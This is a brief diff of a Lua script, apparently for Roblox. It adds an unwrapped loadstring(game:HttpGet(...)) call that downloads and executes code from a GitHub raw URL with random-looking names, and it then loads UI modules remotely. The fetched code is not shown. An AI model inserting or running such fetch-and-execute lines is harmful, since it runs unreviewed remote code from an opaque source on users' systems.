@@ -1,12 +1,6 @@
 print("<?>")
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/u20d30a0298t8g983020z020/u20d30a0298t8g983020z020/refs/heads/main/u20d30a0298t8g9ff02039"))()
-end)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/u20d30a0298t8g983020z020/u20d30a0298t8g983020z020/refs/heads/main/u20d30a0298t8g9ff02039"))()
 print("</>")
-
-task.wait(0.5)
-
 local LoadStart = os.clock()
 local repo = "https://raw.githubusercontent.com/f3a8d1c7e4b9a2f6/UI s/main/"
 local function LoadModule(localPath, remoteName)
